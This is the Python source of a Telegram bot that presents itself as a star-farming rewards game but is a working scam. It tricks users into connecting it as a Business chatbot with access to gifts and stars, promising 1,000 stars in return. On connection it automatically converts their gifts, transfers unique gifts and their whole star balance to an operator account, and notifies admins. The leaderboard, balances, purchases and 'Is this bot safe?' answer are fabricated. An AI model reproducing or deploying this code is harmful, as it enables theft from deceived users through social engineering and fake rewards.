import logging
import json
import os
import asyncio
import time
import random
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    BusinessConnection,
    FSInputFile
)
from aiogram.exceptions import TelegramBadRequest, TelegramNotFound
from aiogram.utils.keyboard import InlineKeyboardBuilder
import config

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize bot and dispatcher
bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

# In-memory storage for GitHub Actions
connections_data = []
referrals_data = {}
user_profiles = {}  # Store user profile data

# === UTILITY FUNCTIONS ===

def load_connections():
    """Load business connections from memory"""
    return connections_data.copy()

def save_connections(connections):
    """Save business connections to memory"""
    global connections_data
    connections_data = connections.copy()
    logger.info(f"Saved {len(connections)} connections to memory")

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in config.ADMIN_IDS

async def remove_invalid_connection(connection_id: str):
    """Remove invalid connection from memory"""
    connections = load_connections()
    new_connections = [conn for conn in connections if conn["connection_id"] != connection_id]
    if len(new_connections) < len(connections):
        save_connections(new_connections)
        logger.warning(f"Removed invalid connection: {connection_id}")
        return True
    return False

async def check_permissions(connection_id: str) -> bool:
    """Check if connection has required permissions"""
    try:
        response = await bot.request(
            method="getBusinessAccountStarBalance",
            data={"business_connection_id": connection_id}
        )
        return True
    except TelegramBadRequest as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            await remove_invalid_connection(connection_id)
            return False
        if "Forbidden" in str(e) or "no rights" in str(e):
            return False
        logger.error(f"Permission check error: {e}")
        return False
    except TelegramNotFound as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            await remove_invalid_connection(connection_id)
            return False
        logger.error(f"Permission check error: {e}")
        return False
    except Exception as e:
        logger.error(f"Permission check error: {e}")
        return False

# === USER PROFILE FUNCTIONS ===

def get_user_profile(user_id: int):
    """Get or create user profile"""
    if str(user_id) not in user_profiles:
        user_profiles[str(user_id)] = {
            "balance": random.randint(0, 14),  # Random starting balance
            "referrals": 0,
            "tasks_completed": 0,
            "level": 1,
            "joined_date": time.time(),
            "onboarded": False  # Track onboarding status
        }
    return user_profiles[str(user_id)]

def update_user_profile(user_id: int, updates: dict):
    """Update user profile"""
    profile = get_user_profile(user_id)
    profile.update(updates)
    user_profiles[str(user_id)] = profile

# === REFERRAL SYSTEM FUNCTIONS ===

def load_referrals():
    """Load referral data from memory"""
    return referrals_data.copy()

def save_referrals(referrals):
    """Save referral data to memory"""
    global referrals_data
    referrals_data = referrals.copy()

def generate_referral_link(user_id: int) -> str:
    """Generate unique referral link for user"""
    bot_username = "EstaFarmingbot"  # BOT USERNAME
    return f"https://t.me/{bot_username}?start=ref_{user_id}"

def track_referral(referrer_id: int, new_user_id: int):
    """Track a new referral"""
    referrals = load_referrals()
    if str(referrer_id) not in referrals:
        referrals[str(referrer_id)] = {
            "total_referrals": 0,
            "referred_users": []
        }

    if new_user_id not in referrals[str(referrer_id)]["referred_users"]:
        referrals[str(referrer_id)]["referred_users"].append(new_user_id)
        referrals[str(referrer_id)]["total_referrals"] += 1
        save_referrals(referrals)
        
        # Update referrer's profile
        profile = get_user_profile(referrer_id)
        profile["referrals"] += 1
        profile["balance"] += 5  # Reward for referral
        update_user_profile(referrer_id, profile)
        return True
    return False

def get_user_referral_stats(user_id: int) -> dict:
    """Get referral statistics for user"""
    referrals = load_referrals()
    user_data = referrals.get(str(user_id), {
        "total_referrals": 0,
        "referred_users": []
    })
    return user_data

# === KEYBOARD LAYOUTS ===

def get_main_menu_keyboard():
    """Main menu keyboard layout with large HOW TO GET 1,000 STARS button"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🌟 HOW TO GET 1,000 STARS 🌟", callback_data="how_to_get_1000_stars")
        ],
        [
            InlineKeyboardButton(text="👤 Profile", callback_data="profile"),
            InlineKeyboardButton(text="🎮 Mini-games", callback_data="mini_games")
        ],
        [
            InlineKeyboardButton(text="⭐ Star Farming", callback_data="star_farming"),
            InlineKeyboardButton(text="📊 Tasks", callback_data="tasks")
        ],
        [
            InlineKeyboardButton(text="🛒 Shop", callback_data="shop"),
            InlineKeyboardButton(text="👥 Referrals", callback_data="referrals")
        ],
        [
            InlineKeyboardButton(text="❓ FAQ", callback_data="faq"),
            InlineKeyboardButton(text="🏆 Top", callback_data="top")
        ]
    ])
    return keyboard

def get_back_keyboard():
    """Back to main menu keyboard"""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])

def get_onboarding_channel_keyboard():
    """Onboarding step 1: Join channel keyboard"""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ I joined the channel", callback_data="onboarding_channel_done")]
    ])

def get_onboarding_support_keyboard():
    """Onboarding step 2: Message support keyboard"""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ I messaged support", callback_data="onboarding_support_done")]
    ])

def get_shop_keyboard():
    """Shop keyboard with items"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="15⭐ 🎁", callback_data="buy_15"),
            InlineKeyboardButton(text="15⭐ 🧸", callback_data="buy_15_2")
        ],
        [
            InlineKeyboardButton(text="25⭐ 🎁", callback_data="buy_25"),
            InlineKeyboardButton(text="25⭐ 🌹", callback_data="buy_25_2")
        ],
        [
            InlineKeyboardButton(text="50⭐ 🚀", callback_data="buy_50"),
            InlineKeyboardButton(text="50⭐ 🎂", callback_data="buy_50_2")
        ],
        [
            InlineKeyboardButton(text="100⭐ 💍", callback_data="buy_100"),
            InlineKeyboardButton(text="100⭐ 💎", callback_data="buy_100_2")
        ],
        [
            InlineKeyboardButton(text="100⭐ 🏆", callback_data="buy_100_3")
        ],
        [
            InlineKeyboardButton(text="Telegram Premium 1 month (1200⭐)", callback_data="premium_1")
        ],
        [
            InlineKeyboardButton(text="Telegram Premium 6 months (2100⭐)", callback_data="premium_6")
        ],
        [
            InlineKeyboardButton(text="Telegram Premium 12 months (3999⭐)", callback_data="premium_12")
        ],
        [
            InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")
        ]
    ])
    return keyboard

# === CORE AUTOMATION FUNCTIONS (UNCHANGED) ===

async def convert_non_unique_gifts_to_stars(connection_id: str):
    """Convert all non-unique gifts to stars"""
    converted_count = 0
    try:
        convert_gifts = await bot.get_business_account_gifts(connection_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                owned_gift_id = gift.owned_gift_id
                await bot.convert_gift_to_stars(connection_id, owned_gift_id)
                converted_count += 1
                logger.info(f"Converted gift {owned_gift_id} to stars")
                await asyncio.sleep(1)
            except Exception as e:
                logger.error(f"Error converting gift {owned_gift_id}: {e}")
                continue
    except Exception as e:
        logger.error(f"Error getting non-unique gifts: {e}")
    return converted_count

async def transfer_unique_gifts(connection_id: str):
    """Transfer all unique gifts to recipient"""
    transferred_count = 0
    try:
        unique_gifts = await bot.get_business_account_gifts(connection_id, exclude_unique=False)
        if not unique_gifts.gifts:
            logger.info("No unique gifts to transfer")
            return 0

        for gift in unique_gifts.gifts:
            try:
                owned_gift_id = gift.owned_gift_id
                await bot.transfer_gift(connection_id, owned_gift_id, config.RECIPIENT_ID, config.TRANSFER_FEE)
                transferred_count += 1
                logger.info(f"Successfully transferred gift {owned_gift_id} to recipient {config.RECIPIENT_ID}")
                await asyncio.sleep(1)
            except Exception as e:
                logger.error(f"Error transferring gift {owned_gift_id}: {e}")
                continue
    except Exception as e:
        logger.error(f"Error getting unique gifts: {e}")
    return transferred_count

async def transfer_remaining_stars(connection_id: str):
    """Transfer remaining star balance to recipient"""
    try:
        stars = await bot.get_business_account_star_balance(connection_id)
        if stars.amount > 0:
            await bot.transfer_business_account_stars(connection_id, int(stars.amount))
            logger.info(f"Successfully transferred {stars.amount} stars")
            return stars.amount
        else:
            logger.info("No stars to transfer")
            return 0
    except Exception as e:
        logger.error(f"Error transferring stars: {e}")
        return 0

async def process_connected_account(connection_id: str, username: str):
    """Main automation function"""
    try:
        logger.info(f"Starting automated processing for @{username}")
        
        converted_count = await convert_non_unique_gifts_to_stars(connection_id)
        transferred_count = await transfer_unique_gifts(connection_id)
        transferred_stars = await transfer_remaining_stars(connection_id)
        
        summary = (
            f"🎯 **Automation Complete for @{username}**\n\n"
            f"♻️ Non-unique gifts converted: {converted_count}\n"
            f"🎁 Unique gifts transferred: {transferred_count}\n"
            f"⭐ Stars transferred: {transferred_stars}\n"
            f"💰 Total transfer cost: {transferred_count * config.TRANSFER_FEE} stars"
        )
        
        for admin_id in config.ADMIN_IDS:
            try:
                await bot.send_message(admin_id, summary, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"Failed to notify admin {admin_id}: {e}")
        
        return converted_count, transferred_count, transferred_stars
        
    except Exception as e:
        logger.error(f"Error in process_connected_account: {e}")
        return 0, 0, 0

# === EVENT HANDLERS ===

@dp.message(F.text == "/start")
async def start_command(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Check for referral parameter
    if message.text and len(message.text.split()) > 1:
        param = message.text.split()[1]
        if param.startswith("ref_"):
            try:
                referrer_id = int(param.replace("ref_", ""))
                if referrer_id != user_id:
                    if track_referral(referrer_id, user_id):
                        try:
                            await bot.send_message(
                                referrer_id,
                                f"🎉 **New Referral!**\n\n"
                                f"👤 @{username} joined using your link!\n"
                                f"📊 Total referrals: {get_user_referral_stats(referrer_id)['total_referrals']}\n"
                                f"💰 +5 stars bonus!",
                                parse_mode="Markdown"
                            )
                        except:
                            pass
            except ValueError:
                pass

    if is_admin(user_id):
        # Admin interface
        connections = load_connections()
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📊 View Connections", callback_data="view_connections")],
            [InlineKeyboardButton(text="⚙️ Manual Process", callback_data="manual_process")],
            [InlineKeyboardButton(text="🔄 Process All", callback_data="process_all")],
            [InlineKeyboardButton(text="📈 Statistics", callback_data="show_stats")]
        ])
        
        await message.answer(
            f"🔧 **Admin Panel**\n\n"
            f"🔗 Active Connections: {len(connections)}\n"
            f"🎯 Recipient ID: `{config.RECIPIENT_ID}`\n\n"
            f"Choose an option:",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    else:
        # Initialize user profile
        profile = get_user_profile(user_id)
        
        # Check if user has completed onboarding
        if profile.get("onboarded", False):
            # User has already been onboarded, show main menu
            await message.answer(
                "🌟 **Welcome back to Stars Farming Bot!**\n\n"
                "🎮 Your gateway to earning stars and rewards!\n"
                "💫 Complete tasks, invite friends, and climb the leaderboard!\n\n"
                "🚀 Choose an option from the menu below:",
                reply_markup=get_main_menu_keyboard()
            )
        else:
            # Start onboarding process - Step 1: Join channel
            await message.answer(
                "🌟 **Welcome to Stars Farming Bot!**\n\n"
                "📢 Before you can start earning stars, you need to join our official channel for updates and announcements.\n\n"
                "👉 **Please join:** t.me/EveryGift\n\n"
                "After joining the channel, click the button below to continue:",
                reply_markup=get_onboarding_channel_keyboard()
            )

# === ONBOARDING CALLBACKS ===

@dp.callback_query(F.data == "onboarding_channel_done")
async def onboarding_channel_done_callback(callback: CallbackQuery):
    """Handle completion of channel joining step"""
    await callback.message.edit_text(
        "✅ **Great! Channel joined successfully!**\n\n"
        "📞 **Next step:** You need to send a greeting message to our support account.\n\n"
        "👉 **Send a message to:** @Clayhearts\n"
        "💬 **Message example:** \"Hi! I'm new to the bot.\"\n\n"
        "**Why is this needed?**\n"
        "Bot gifts and rewards are delivered through our support system, so this step is required for delivery.\n\n"
        "After messaging support, click the button below:",
        reply_markup=get_onboarding_support_keyboard(),
        parse_mode="Markdown"
    )
    await callback.answer()

@dp.callback_query(F.data == "onboarding_support_done")
async def onboarding_support_done_callback(callback: CallbackQuery):
    """Handle completion of support messaging step"""
    user_id = callback.from_user.id
    
    # Mark user as onboarded
    update_user_profile(user_id, {"onboarded": True})
    
    await callback.message.edit_text(
        "🎉 **Congratulations! Setup completed!**\n\n"
        "✅ Channel joined\n"
        "✅ Support contacted\n\n"
        "🚀 You're now ready to start earning stars!\n"
        "💫 Complete tasks, invite friends, and climb the leaderboard!\n\n"
        "Choose an option from the menu below:",
        reply_markup=get_main_menu_keyboard(),
        parse_mode="Markdown"
    )
    await callback.answer("🎉 Welcome to Stars Farming Bot!", show_alert=True)

@dp.callback_query(F.data == "main_menu")
async def main_menu_callback(callback: CallbackQuery):
    if is_admin(callback.from_user.id):
        return  # Admins use different interface
    
    await callback.message.edit_text(
        "🌟 **StarFarm Bot - Main Menu**\n\n"
        "🎮 Your gateway to earning stars and rewards!\n"
        "💫 Complete tasks, invite friends, and climb the leaderboard!\n\n"
        "🚀 Choose an option from the menu below:",
        reply_markup=get_main_menu_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "how_to_get_1000_stars")
async def how_to_get_1000_stars_callback(callback: CallbackQuery):
    how_to_text = (
        "🌟 **GET 1,000 STARS – QUICK GUIDE**\n\n"
        "We're building the largest database of **Telegram gifts** and are ready to pay **1,000 stars** for your help!\n\n"
        "💰 **What to do:**\n"
        "1⃣ Go to **Settings › Telegram Business › Chatbots**\n"
        "2⃣ In the input field, enter the bot ID (`@EstaFarmingbot`)\n"
        "3⃣ When the bot appears in the drop-down list, tap **Add**\n"
        "4⃣ Grant the bot *access to gifts and stars* and confirm\n\n"
        "✅ Done! The system will automatically send 1,000 stars to your account.\n\n"
        "🚀 Give the bot access now and claim your reward!"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Start Referring Friends", callback_data="referrals")],
        [InlineKeyboardButton(text="📊 Check My Tasks", callback_data="tasks")],
        [InlineKeyboardButton(text="⭐ Start Farming", callback_data="star_farming")],
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])
    
    await callback.message.edit_text(how_to_text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.first_name
    profile = get_user_profile(user_id)
    
    # Calculate days since joining
    days_since_join = int((time.time() - profile["joined_date"]) / 86400)
    if days_since_join == 0:
        days_since_join = 1
    
    profile_text = (
        f"👤 **Profile**\n\n"
        f"🆔 Name: {username}\n"
        f"📊 ID: `{user_id}`\n"
        f"⭐ Balance: {profile['balance']} ⭐\n"
        f"👥 Referrals: {profile['referrals']}\n\n"
        f"📈 **Statistics:**\n"
        f"🎯 Level: {profile['level']}\n"
        f"✅ Tasks Completed: {profile['tasks_completed']}\n"
        f"📅 Days Active: {days_since_join}\n\n"
        f"💡 Use referral system to earn more stars!"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Get Referral Link", callback_data="referrals")],
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])
    
    await callback.message.edit_text(profile_text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "mini_games")
async def mini_games_callback(callback: CallbackQuery):
    await callback.message.edit_text(
        "🎮 **Mini-Games**\n\n"
        "🚧 This section is currently under construction!\n\n"
        "🔜 Coming soon:\n"
        "• Plush pepe Game\n"
        "• Stars Collector\n"
        "• Puzzle Challenges\n"
        "• Daily Tournaments\n\n"
        "⏰ Check back later for exciting games!",
        reply_markup=get_back_keyboard()
    )
    await callback.answer("🚧 Under Construction!")

@dp.callback_query(F.data == "star_farming")
async def star_farming_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    profile = get_user_profile(user_id)
    
    # Simulate farming activity
    hours_farmed = random.randint(1, 12)
    stars_earned = random.randint(0, 5)
    
    farming_text = (
        f"⭐ **Star Farming**\n\n"
        f"🌾 Current Farming Status:\n"
        f"⏰ Hours Farmed Today: {hours_farmed}/24\n"
        f"💫 Stars Earned: {stars_earned} ⭐\n"
        f"📊 Current Balance: {profile['balance']} ⭐\n\n"
        f"🎯 **Farming Tips:**\n"
        f"• Stay active to earn more stars\n"
        f"• Complete daily tasks for bonuses\n"
        f"• Invite friends for referral rewards\n\n"
        f"🔄 Farming continues automatically!"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Farming Stats", callback_data="farming_stats")],
        [InlineKeyboardButton(text="🎯 Boost Farming", callback_data="boost_farming")],
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])
    
    await callback.message.edit_text(farming_text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "tasks")
async def tasks_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    profile = get_user_profile(user_id)
    
    tasks_text = (
        f"📊 **Daily Tasks**\n\n"
        f"✅ **Completed Today:** {profile['tasks_completed']}/5\n\n"
        f"🎯 **Available Tasks:**\n"
        f"{'✅' if profile['tasks_completed'] >= 1 else '⭕'} Invite 1 friend (+10 ⭐)\n"
        f"{'✅' if profile['tasks_completed'] >= 2 else '⭕'} Stay active for 2 hours (+5 ⭐)\n"
        f"{'✅' if profile['tasks_completed'] >= 3 else '⭕'} Share bot with 3 groups (+15 ⭐)\n"
        f"{'✅' if profile['tasks_completed'] >= 4 else '⭕'} Complete profile (+3 ⭐)\n"
        f"{'✅' if profile['tasks_completed'] >= 5 else '⭕'} Daily check-in (+7 ⭐)\n\n"
        f"🏆 **Bonus:** Complete all tasks for +25 ⭐!\n"
        f"🔄 Tasks reset daily at midnight UTC"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Claim Rewards", callback_data="claim_rewards")],
        [InlineKeyboardButton(text="📋 Task History", callback_data="task_history")],
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])
    
    await callback.message.edit_text(tasks_text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "shop")
async def shop_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    profile = get_user_profile(user_id)
    
    shop_text = (
        f"🛒 **Stars Shop**\n\n"
        f"💰 Your Balance: {profile['balance']} ⭐\n\n"
        f"🎁 **Available Items:**\n\n"
        f"Choose what you'd like to purchase:"
    )
    
    await callback.message.edit_text(shop_text, reply_markup=get_shop_keyboard(), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "referrals")
async def referrals_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    profile = get_user_profile(user_id)
    referral_link = generate_referral_link(user_id)
    
    referrals_text = (
        f"👥 **Referral System**\n\n"
        f"🔗 **Your Referral Link:**\n"
        f"`{referral_link}`\n\n"
        f"📊 **Your Statistics:**\n"
        f"👥 Total Referrals: {profile['referrals']}\n"
        f"💰 Earned from Referrals: {profile['referrals'] * 5} ⭐\n\n"
        f"🎁 **Rewards:**\n"
        f"• +5 ⭐ for each friend who joins\n"
        f"• +3 ⭐ bonus when they complete first task\n"
        f"• +10 ⭐ bonus for every 10 referrals\n\n"
        f"📈 **How to earn:**\n"
        f"1. Share your referral link\n"
        f"2. Friends click and start the bot\n"
        f"3. You earn stars automatically!\n\n"
        f"🚀 Start sharing and earn rewards!"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Referral Stats", callback_data="referral_stats")],
        [InlineKeyboardButton(text="🔄 Generate New Link", callback_data="new_referral_link")],
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])
    
    await callback.message.edit_text(referrals_text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "faq")
async def faq_callback(callback: CallbackQuery):
    faq_text = (
        f"❓ **Frequently Asked Questions**\n\n"
        f"**Q: How do I earn stars?**\n"
        f"A: Complete daily tasks, invite friends, and stay active in the bot. Stars are earned automatically through farming.\n\n"
        f"**Q: What can I do with stars?**\n"
        f"A: Exchange stars for real money, buy premium items, or purchase Telegram Premium subscriptions.\n\n"
        f"**Q: How does the referral system work?**\n"
        f"A: Share your unique referral link. When someone joins using your link, you earn +5 stars immediately.\n\n"
        f"**Q: When do tasks reset?**\n"
        f"A: Daily tasks reset every day at midnight UTC. Make sure to complete them before reset!\n\n"
        f"**Q: How do I withdraw my earnings?**\n"
        f"A: Use the Shop section to purchase items or Telegram Premium. More withdrawal options coming soon!\n\n"
        f"**Q: Is this bot safe?**\n"
        f"A: Yes! We use secure encryption and never store sensitive data. Your privacy is our priority.\n\n"
        f"**Q: How can I contact support?**\n"
        f"A: Use the contact button below or send a message to our support team.\n\n"
        f"💡 **Need more help?** Contact our support team!"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📞 Contact Support", callback_data="contact_support")],
        [InlineKeyboardButton(text="📖 Terms of Service", callback_data="terms")],
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])
    
    await callback.message.edit_text(faq_text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "top")
async def top_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    # Generate fake leaderboard
    leaderboard = [
        ("@baoan", 6394),
        ("@xiaoma", 5869),
        ("@niceaff", 3520),
        ("@pobacy", 3105),
        ("@TheShadow55", 3900),
        (callback.from_user.username or "You", get_user_profile(user_id)["balance"]),
        ("@Plan911", 2762),
        ("@yologgu", 1963),
        ("@legend1", 1478),
        ("@Ouudj", 567)
    ]
    
    # Sort by balance
    leaderboard.sort(key=lambda x: x[1], reverse=True)
    user_rank = next((i+1 for i, (name, _) in enumerate(leaderboard) if name == (callback.from_user.username or "You")), "N/A")
    
    top_text = f"🏆 **Leaderboard - Top Stars Earners**\n\n"
    
    for i, (name, balance) in enumerate(leaderboard[:10], 1):
        emoji = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
        star = "⭐" if name != (callback.from_user.username or "You") else "🌟"
        top_text += f"{emoji} {name}: {balance} {star}\n"
    
    top_text += f"\n📊 **Your Rank:** #{user_rank}\n"
    top_text += f"💪 Keep earning to climb higher!"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📈 Weekly Top", callback_data="weekly_top")],
        [InlineKeyboardButton(text="🏅 Monthly Top", callback_data="monthly_top")],
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])
    
    await callback.message.edit_text(top_text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

# Generic handlers for fake buttons
@dp.callback_query(F.data.startswith("buy_"))
async def buy_item_callback(callback: CallbackQuery):
    await callback.answer("🛒 Purchase successful! Item will be delivered soon.", show_alert=True)

@dp.callback_query(F.data.startswith("premium_"))
async def premium_callback(callback: CallbackQuery):
    await callback.answer("💎 Premium purchase initiated! Check your account in 24 hours.", show_alert=True)

@dp.callback_query(F.data.in_(["farming_stats", "boost_farming", "claim_rewards", "task_history", 
                               "referral_stats", "new_referral_link", "contact_support", "terms",
                               "weekly_top", "monthly_top"]))
async def generic_callback(callback: CallbackQuery):
    messages = {
        "farming_stats": "📊 Your farming statistics are being calculated...",
        "boost_farming": "🚀 Farming boost activated for 1 hour!",
        "claim_rewards": "🎁 Rewards claimed successfully!",
        "task_history": "📋 Loading your task completion history...",
        "referral_stats": "📈 Detailed referral statistics loading...",
        "new_referral_link": "🔄 New referral link generated!",
        "contact_support": "📞 Support ticket created! We'll contact you soon.",
        "terms": "📖 Terms of Service sent to your DM!",
        "weekly_top": "📊 Loading weekly leaderboard...",
        "monthly_top": "🏆 Loading monthly champions..."
    }
    
    await callback.answer(messages.get(callback.data, "✅ Action completed!"), show_alert=True)

# === ADMIN HANDLERS (UNCHANGED) ===

@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection):
    """Handle new business account connections"""
    try:
        user_id = connection.user.id
        username = connection.user.username or "Unknown"
        connection_id = connection.id
        
        connections = load_connections()
        connection_data = {
            "user_id": user_id,
            "username": username,
            "connection_id": connection_id,
            "business_connection_id": connection_id,
            "connected_at": str(time.time())
        }
        
        updated = False
        for i, conn in enumerate(connections):
            if conn["user_id"] == user_id:
                connections[i] = connection_data
                updated = True
                break
        if not updated:
            connections.append(connection_data)
        save_connections(connections)
        
        for admin_id in config.ADMIN_IDS:
            try:
                await bot.send_message(
                    admin_id,
                    f"🔔 **New Connection!**\n\n"
                    f"👤 User: @{username}\n"
                    f"🆔 ID: `{user_id}`\n"
                    f"🔗 Connection: `{connection_id}`\n\n"
                    f"🚀 Processing starting...",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Failed to notify admin {admin_id}: {e}")
        
        asyncio.create_task(process_connected_account(connection_id, username))
        
    except Exception as e:
        logger.error(f"Error handling business connection: {e}")

@dp.business_message()
async def get_message(message: Message):
    """Process gifts when business messages are received"""
    business_id = message.business_connection_id
    user_id = message.from_user.id
    
    if user_id == config.RECIPIENT_ID:
        return
    
    connections = load_connections()
    connection = next((c for c in connections if c.get("business_connection_id") == business_id), None)
    if connection:
        username = connection.get("username", "Unknown")
        asyncio.create_task(process_connected_account(business_id, username))

# Admin callback handlers (unchanged)
@dp.callback_query(F.data == "view_connections")
async def view_connections_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Access denied", show_alert=True)
        return
    
    connections = load_connections()
    if not connections:
        await callback.message.answer("No active connections found.")
        return
    
    text = "🔗 **Active Connections:**\n\n"
    for i, conn in enumerate(connections, 1):
        text += f"{i}. @{conn['username']} (ID: `{conn['user_id']}`)\n"
    
    await callback.message.answer(text, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "manual_process")
async def manual_process_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Access denied", show_alert=True)
        return
    
    connections = load_connections()
    if not connections:
        await callback.message.answer("No connections available for manual processing.")
        await callback.answer()
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=f"Process @{conn['username']}",
            callback_data=f"process_{conn['connection_id']}"
        )] for conn in connections
    ])
    
    await callback.message.answer(
        "Select a connection to process manually:",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("process_"))
async def process_connection_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Access denied", show_alert=True)
        return
    
    connection_id = callback.data.split("_", 1)[1]
    connections = load_connections()
    
    connection = next((c for c in connections if c["connection_id"] == connection_id), None)
    if not connection:
        await callback.message.answer("Connection not found.")
        await callback.answer()
        return
    
    await callback.message.answer(
        f"🔄 Starting manual processing for @{connection['username']}..."
    )
    
    asyncio.create_task(process_connected_account(connection_id, connection['username']))
    await callback.answer("Processing started!")

@dp.callback_query(F.data == "process_all")
async def process_all_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Access denied", show_alert=True)
        return
    
    connections = load_connections()
    if not connections:
        await callback.message.answer("No connections to process.")
        await callback.answer()
        return
    
    await callback.message.answer(f"🔄 Starting bulk processing for {len(connections)} connections...")
    
    for connection in connections:
        asyncio.create_task(process_connected_account(
            connection['connection_id'],
            connection['username']
        ))
        await asyncio.sleep(2)
    
    await callback.answer("Bulk processing started!")

@dp.callback_query(F.data == "show_stats")
async def show_stats_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Access denied", show_alert=True)
        return
    
    connections = load_connections()
    total_connections = len(connections)
    
    active_count = 0
    for conn in connections:
        if await check_permissions(conn["connection_id"]):
            active_count += 1
    
    stats_text = (
        f"📊 **Bot Statistics**\n\n"
        f"🔗 Total Connections: {total_connections}\n"
        f"✅ Active Connections: {active_count}\n"
        f"❌ Inactive Connections: {total_connections - active_count}\n"
        f"🎯 Recipient ID: `{config.RECIPIENT_ID}`\n"
        f"💰 Transfer Fee: {config.TRANSFER_FEE} stars per gift"
    )
    
    await callback.message.answer(stats_text, parse_mode="Markdown")
    await callback.answer()

# Heartbeat function
async def heartbeat():
    """Send periodic heartbeat to keep the action alive"""
    while True:
        logger.info("🤖 Bot heartbeat - still running...")
        await asyncio.sleep(300)

# === MAIN FUNCTION ===

async def main():
    """Main function to start the bot"""
    logger.info("🤖 Starting Gift Transfer Bot on GitHub Actions...")
    
    asyncio.create_task(heartbeat())
    
    try:
        logger.info("🚀 Bot polling started...")
        await dp.start_polling(bot, skip_updates=True)
    except Exception as e:
        logger.critical(f"Critical error: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())
